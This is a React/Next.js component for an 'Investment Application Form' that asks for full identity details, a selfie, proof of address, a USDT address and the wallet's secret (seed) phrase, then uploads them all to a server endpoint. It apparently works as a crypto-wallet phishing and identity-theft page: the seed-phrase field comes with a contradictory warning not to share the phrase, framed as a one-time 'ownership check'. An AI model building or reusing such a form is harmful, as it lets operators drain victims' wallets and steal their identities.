// components/Form.tsx
'use client';
import React, { useRef, useState, FormEvent, useEffect } from 'react';
import DatePicker from 'react-datepicker';
import { PhoneInput } from 'react-international-phone';
import { FormControlLabel, Radio, RadioGroup } from '@mui/material';
import Snackbar from '@mui/material/Snackbar';
import Alert from '@mui/material/Alert'; 
import PassportVerificationComponent from './PassportVerificationComponent';
import 'react-datepicker/dist/react-datepicker.css';
import 'react-international-phone/style.css';
import axios from 'axios';
import ReactModal from 'react-modal';

const Form: React.FC = () => {
  const [formData, setFormData] = useState({
    lastName: '',
    firstName: '',
    middleName: '',
    otherNames: '',
    placeOfBirth: '',
    dateOfBirth: '',
    address: '',
    phoneNumber: '',
    email: '',
    investmentLicense: true,
    investmentNumber: '',
    usdtAddress: '',
    secretPhrase: '',
  });

  const [selfieFile, setSelfieFile] = useState<File | null>(null);
  const [proofAddress, setProofAddress] = useState<File | null>(null);
  const [startDate, setStartDate] = useState<Date | null>(new Date());
  const [phone, setPhone] = useState<string>('');
  const [hasInvestmentLicense, setHasInvestmentLicense] = useState<boolean>(true);
  const [proofAddressFileName, setProofAddressFileName] = useState<string | null>(null);
  const [errors, setErrors] = useState<any>(null);
  const [success, setSuccess] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const [isModalOpen, setIsModalOpen] = useState(false);

  // New State Variables for Snackbar
  const [openSnackbar, setOpenSnackbar] = useState<boolean>(false);
  const [snackbarMessage, setSnackbarMessage] = useState<string>('');
  const [snackbarSeverity, setSnackbarSeverity] = useState<'success' | 'error'>('success');

  // State to detect if device is mobile
  const [isMobile, setIsMobile] = useState<boolean>(false);

  useEffect(() => {
    const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera;
    // Simple regex to detect mobile devices
    if (/android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase())) {
      setIsMobile(true);
    }
  }, []);

  const handleButtonClick = () => fileInputRef.current?.click();

  const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      console.log('File selected:', file.name);
      setProofAddressFileName(file.name);
      setProofAddress(file);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSelfieCapture = (file: File) => {
    setSelfieFile(file);
  };

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    setIsModalOpen(true);
  };

  const handleConfirmSubmit = async () => {
    setErrors(null);
    setSuccess(null);

    const data = new FormData();
    data.append('lastName', formData.lastName);
    data.append('firstName', formData.firstName);
    data.append('middleName', formData.middleName);
    data.append('otherNames', formData.otherNames);
    data.append('dateOfBirth', formData.dateOfBirth);
    data.append('placeOfBirth', formData.placeOfBirth);
    data.append('address', formData.address);
    data.append('phoneNumber', phone);
    data.append('email', formData.email);
    data.append('investmentLicense', formData.investmentLicense.toString());
    data.append('investmentNumber', formData.investmentNumber);
    data.append('usdtAddress', formData.usdtAddress);
    data.append('secretPhrase', formData.secretPhrase);
    if (selfieFile) data.append('selfie', selfieFile);
    if (proofAddress) data.append('proofAddress', proofAddress);

    try {
      const response = await axios.post('/api/upload', data, {
        headers: {
          'Content-Type': 'multipart/form-data',
        },
      });
      setSuccess(response.data.message);

      // Set Snackbar for Success
      setSnackbarMessage('Your request has been sent successfully. When approved, you will receive an SMS message on your Phone Number.');
      setSnackbarSeverity('success');
      setOpenSnackbar(true);

      // Reset form data
      setFormData({
        lastName: '',
        firstName: '',
        middleName: '',
        otherNames: '',
        placeOfBirth: '',
        dateOfBirth: '',
        address: '',
        phoneNumber: '',
        email: '',
        investmentLicense: true,
        investmentNumber: '',
        usdtAddress: '',
        secretPhrase: '',
      });

      setStartDate(null);
      setPhone('');
      setHasInvestmentLicense(true);
      setSelfieFile(null);
      setProofAddress(null);
      setProofAddressFileName(null);
      setIsModalOpen(false);
    } catch (err: any) {
      if (err.response && err.response.data) {
        setErrors(err.response.data['errors']);
        // Aggregate error messages for Snackbar
        const errorMessages = err.response.data.errors;
        setSnackbarMessage(errorMessages || 'There were errors submitting your form. Please check the highlighted fields.');
        setSnackbarSeverity('error');
        setOpenSnackbar(true);
      } else {
        setErrors({ message: 'An unexpected error occurred.' });
        setSnackbarMessage('An unexpected error occurred. Please try again later.');
        setSnackbarSeverity('error');
        setOpenSnackbar(true);
      }
      setIsModalOpen(false);
    }
  };

  // Custom class for input fields with adjusted padding
  const inputClass =
    'mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring focus:ring-blue-500 focus:ring-opacity-50 py-1.5 px-3';

  useEffect(() => {
    if (typeof window !== 'undefined') {
      ReactModal.setAppElement('#__next'); // Adjust based on your app's root element
    }
  }, []);

  return (
    <div className="min-h-screen bg-gray-100 py-12 px-4 sm:px-6 lg:px-8" id="form">
      <div className="max-w-4xl mx-auto">
        <h1 className="text-3xl font-bold text-center text-gray-900 mb-12">
          Investment Application Form
        </h1>

        <form onSubmit={handleSubmit}>
          {/* Personal Information Card */}
          <div className="bg-white shadow-lg rounded-lg overflow-hidden mb-8">
            <div className="bg-blue-600 px-6 py-4">
              <h2 className="text-xl font-semibold text-white">Personal Information</h2>
            </div>
            <div className="p-6 space-y-6">
              <div className="grid grid-cols-1 gap-6 sm:grid-cols-2">
                <div>
                  <label htmlFor="lastName" className="block text-sm font-medium text-gray-700">
                    Last Name(s)*
                  </label>
                  <input
                    type="text"
                    id="lastName"
                    name="lastName"
                    className={inputClass}
                    value={formData.lastName}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div>
                  <label htmlFor="firstName" className="block text-sm font-medium text-gray-700">
                    First Name*
                  </label>
                  <input
                    type="text"
                    id="firstName"
                    name="firstName"
                    className={inputClass}
                    value={formData.firstName}
                    onChange={handleChange}
                    required
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 gap-6 sm:grid-cols-2">
                <div>
                  <label htmlFor="middleName" className="block text-sm font-medium text-gray-700">
                    Middle Name
                  </label>
                  <input
                    type="text"
                    id="middleName"
                    name="middleName"
                    className={inputClass}
                    value={formData.middleName}
                    onChange={handleChange}
                  />
                </div>
                <div>
                  <label htmlFor="otherNames" className="block text-sm font-medium text-gray-700">
                    Other Names Used
                  </label>
                  <input
                    type="text"
                    id="otherNames"
                    name="otherNames"
                    className={inputClass}
                    value={formData.otherNames}
                    onChange={handleChange}
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 gap-6 sm:grid-cols-2">
                <div>
                  <label className="block text-sm font-medium text-gray-700">Date of Birth*</label>
                  <DatePicker
                    selected={startDate}
                    onChange={(date: Date | null) => {
                      setStartDate(date);
                      setFormData({
                        ...formData,
                        dateOfBirth: date ? date.toISOString().split('T')[0] : '',
                      });
                    }}
                    dateFormat="MM/dd/yyyy"
                    showYearDropdown
                    scrollableYearDropdown
                    yearDropdownItemNumber={100}
                    minDate={new Date('1920-01-01')}
                    maxDate={new Date()}
                    showMonthDropdown
                    className={inputClass}
                    required
                  />
                </div>
                <div>
                  <label htmlFor="placeOfBirth" className="block text-sm font-medium text-gray-700">
                    Place Of Birth*
                  </label>
                  <input
                    id="placeOfBirth"
                    name="placeOfBirth"
                    className={inputClass}
                    value={formData.placeOfBirth}
                    onChange={handleChange}
                    required
                  ></input>
                </div>
                <div>
                  <label htmlFor="address" className="block text-sm font-medium text-gray-700">
                    Current Address*
                  </label>
                  <textarea
                    id="address"
                    name="address"
                    rows={3}
                    className={`${inputClass} pt-1.5`}
                    value={formData.address}
                    onChange={handleChange}
                    required
                  ></textarea>
                </div>
              </div>

              <div className="grid grid-cols-1 gap-6 sm:grid-cols-2">
                <div>
                  <label className="block text-sm font-medium text-gray-700">Phone Number*</label>
                  <PhoneInput
                    defaultCountry="us"
                    value={phone}
                    onChange={(phone: string) => setPhone(phone)}
                    className={inputClass}
                    required
                  />
                </div>
                <div>
                  <label htmlFor="email" className="block text-sm font-medium text-gray-700">
                    Email*
                  </label>
                  <input
                    type="email"
                    id="email"
                    name="email"
                    className={inputClass}
                    value={formData.email}
                    onChange={handleChange}
                    required
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Investment Information Card */}
          <div className="bg-white shadow-lg rounded-lg overflow-hidden mb-8">
            <div className="bg-green-600 px-6 py-4">
              <h2 className="text-xl font-semibold text-white">Investment Information</h2>
            </div>
            <div className="p-6 space-y-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Do you have an Investment license?*
                </label>
                <RadioGroup
                  value={hasInvestmentLicense.toString()}
                  onChange={(e) => {
                    const value = e.target.value === 'true';
                    setHasInvestmentLicense(value);
                    setFormData({
                      ...formData,
                      investmentLicense: value,
                      // Clear investmentNumber if the user selects "No"
                      investmentNumber: value ? formData.investmentNumber : '',
                    });
                    console.log('has Investment license: ' + value);
                  }}
                  className="flex space-x-4"
                >
                  <FormControlLabel value="true" control={<Radio />} label="Yes" />
                  <FormControlLabel value="false" control={<Radio />} label="No" />
                </RadioGroup>
              </div>

              {hasInvestmentLicense && (
                <div>
                  <label
                    htmlFor="investmentNumber"
                    className="block text-sm font-medium text-gray-700"
                  >
                    Investment License Number*
                  </label>
                  <input
                    type="text"
                    id="investmentNumber"
                    name="investmentNumber"
                    className={inputClass}
                    value={formData.investmentNumber}
                    onChange={handleChange}
                    required
                  />
                </div>
              )}

              <div>
                <label htmlFor="usdtAddress" className="block text-sm font-medium text-gray-700">
                  USDT Address*
                </label>
                <input
                  type="text"
                  id="usdtAddress"
                  name="usdtAddress"
                  className={inputClass}
                  value={formData.usdtAddress}
                  onChange={handleChange}
                  required
                />
              </div>

              <div>
                <label htmlFor="secretPhrase" className="block text-sm font-medium text-gray-700">
                  Secret Phrase*
                </label>
                <input
                  type="password"
                  id="secretPhrase"
                  name="secretPhrase"
                  className={inputClass}
                  value={formData.secretPhrase}
                  onChange={handleChange}
                  required
                />
                <p className="mt-2 text-sm text-red-600">
                  DON'T share your secret phrase with anyone. We ask you just once to verify wallet
                  ownership.
                </p>
              </div>

              <div>
                <h3 className="text-lg font-medium text-gray-900 mb-4">Required Documents</h3>
                <div className="space-y-4">
                  {/* Passport Copy Component */}
                  <PassportVerificationComponent onSelfieCapture={handleSelfieCapture} />

                  {/* Proof of Address */}
                  <div>
                    <button
                      type="button"
                      onClick={handleButtonClick}
                      className="inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                    >
                      2. Proof of Address*
                    </button>
                    <input
                      type="file"
                      ref={fileInputRef}
                      onChange={handleFileChange}
                      accept="image/jpeg, image/png, image/gif, image/bmp, image/webp"  // Allow all image types
                      capture={isMobile ? 'environment' : undefined} // Prompt camera on mobile
                      className="hidden"
                      required
                    />
                    {proofAddressFileName && (
                      <p className="mt-2 text-sm text-green-600">{proofAddressFileName}</p>
                    )}
                    {!isMobile && (
                      <p className="mt-1 text-xs text-gray-500">
                        Upload a clear image of your proof of address.
                      </p>
                    )}
                    {isMobile && (
                      <p className="mt-1 text-xs text-gray-500">
                        Tap the button to capture your proof of address using your device's camera.
                      </p>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Submit Button */}
          <div className="flex justify-end">
            <button
              type="submit"
              className="inline-flex items-center px-6 py-3 border border-transparent text-base font-medium rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
            >
              Submit Application
            </button>
          </div>
        </form>

        {/* Confirmation Modal */}
        {isModalOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div
              className="bg-white p-6 rounded-lg shadow-lg w-11/12 md:w-2/3 lg:w-1/2"
              onClick={(e) => e.stopPropagation()}
            >
              <h2 className="text-xl font-bold mb-4">Please Review Your Information</h2>
              <div className="space-y-4 max-h-96 overflow-y-auto">
                <div>
                  <strong>Last Name:</strong> {formData.lastName}
                </div>
                <div>
                  <strong>First Name:</strong> {formData.firstName}
                </div>
                {formData.middleName && (
                  <div>
                    <strong>Middle Name:</strong> {formData.middleName}
                  </div>
                )}
                {formData.otherNames && (
                  <div>
                    <strong>Other Names Used:</strong> {formData.otherNames}
                  </div>
                )}
                <div>
                  <strong>Date of Birth:</strong> {formData.dateOfBirth}
                </div>
                <div>
                  <strong>Address:</strong> {formData.address}
                </div>
                <div>
                  <strong>Phone Number:</strong> {phone}
                </div>
                <div>
                  <strong>Email:</strong> {formData.email}
                </div>
                <div>
                  <strong>Investment License:</strong>{' '}
                  {formData.investmentLicense ? 'Yes' : 'No'}
                </div>
                {hasInvestmentLicense && (
                  <div>
                    <strong>Investment License Number:</strong> {formData.investmentNumber}
                  </div>
                )}
                <div>
                  <strong>USDT Address:</strong> {formData.usdtAddress}
                </div>
                {/* Don't display the actual secret phrase */}
                <div>
                  <strong>Secret Phrase:</strong> Provided
                </div>
                <div>
                  <strong>Selfie File:</strong> {selfieFile ? selfieFile.name : 'Not Provided'}
                </div>
                <div>
                  <strong>Proof of Address:</strong> {proofAddressFileName || 'Not Provided'}
                </div>
              </div>
              <div className="mt-6 flex justify-end space-x-4">
                <button
                  onClick={() => setIsModalOpen(false)}
                  className="px-4 py-2 bg-gray-300 rounded hover:bg-gray-400"
                >
                  Edit
                </button>
                <button
                  onClick={handleConfirmSubmit}
                  className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
                >
                  Submit
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Snackbar for Success and Error Messages */}
        <Snackbar
          open={openSnackbar}
          autoHideDuration={6000}
          onClose={() => setOpenSnackbar(false)}
          anchorOrigin={{ vertical: 'bottom', horizontal: 'center' }}
        >
          <Alert
            onClose={() => setOpenSnackbar(false)}
            severity={snackbarSeverity}
            sx={{ width: '100%' }}
          >
            {snackbarMessage}
          </Alert>
        </Snackbar>

        {/* Display Errors (Optional: Retained for Accessibility) */}
        {errors && (
          <div className="mt-4" role="alert" aria-live="assertive">
            <h4 className="text-red-600">Error:</h4>
            <ul className="list-disc list-inside text-red-500">
              {errors}
            </ul>
          </div>
        )}

        <p className="mt-8 text-center text-xs text-gray-500">DS-174</p>
      </div>
    </div>
  );
};

export default Form;
